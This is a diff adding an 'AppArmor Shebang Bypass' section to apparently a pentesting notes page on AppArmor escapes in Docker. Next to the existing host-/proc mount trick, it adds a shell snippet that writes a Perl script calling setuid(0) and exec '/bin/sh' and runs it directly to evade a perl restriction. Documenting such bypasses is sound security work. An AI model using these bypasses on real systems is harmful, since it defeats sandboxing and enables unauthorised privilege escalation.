@@ -281,3 +281,17 @@ In the weird case you can **modify the apparmor docker profile and reload it.** 
 ### AppArmor Docker Bypass2
 
 **AppArmor is path based**, this means that even if it might be **protecting** files inside a directory like **`/proc`** if you can **configure how the container is going to be run**, you could **mount** the proc directory of the host inside **`/host/proc`** and it **won't be protected by AppArmor anymore**.
+
+### AppArmor Shebang Bypass
+
+In [**this bug**](https://bugs.launchpad.net/apparmor/+bug/1911431) you can see an example of how **even if you are preventing perl to be run with certain resources**, if you just create a a shell script **specifying** in the first line **`#!/usr/bin/perl`** and you **execute the file directly**, you will be able to execute whatever you want. E.g.:
+
+```perl
+echo '#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh"' > /tmp/test.pl
+chmod +x /tmp/test.pl
+/tmp/test.pl
+```
